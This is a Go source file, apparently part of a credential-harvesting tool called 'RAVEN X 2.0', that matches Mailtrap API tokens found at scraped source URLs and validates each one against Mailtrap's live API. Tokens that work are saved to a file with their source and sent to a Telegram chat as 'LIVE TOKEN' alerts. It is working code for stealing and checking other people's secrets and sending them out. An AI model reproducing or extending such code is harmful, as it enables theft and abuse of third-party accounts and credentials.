package main

import (
	"fmt"
	"net/http"
	"regexp"
)

// Mailtrap API tokens are 32-char lowercase alphanumeric strings (not hex-only).
// secrets-patterns-db confirms [a-z0-9]{32}; 'x','k' chars from example confirm non-hex.
// Validation hits GET /api/accounts with Api-Token header.
// Covers MAILTRAP_API_TOKEN, MAILTRAP_TOKEN, MAILTRAP_API_KEY, and Api-Token header context.
var mailtrapPattern = regexp.MustCompile(`(?i)(?:mailtrap[_\-]?(?:api[_\-]?)?(?:token|key)|MAILTRAP_(?:API_)?(?:TOKEN|KEY)|Api-Token)["'\s:=]+([a-z0-9]{32})`)

// CheckMailtrap validates a Mailtrap API token by listing accounts.
// 200 = token is valid; anything else = not confirmed.
func (a *AWSScanner) CheckMailtrap(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mailtrap {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://mailtrap.io/api/accounts", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Api-Token", key)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Mailtrap", fmt.Sprintf("Token: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mailtrap.txt")
		a.storeValidKeyLimit("Mailtrap", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📬 <b>MAILTRAP LIVE TOKEN</b>

🔑 <b>Token:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}
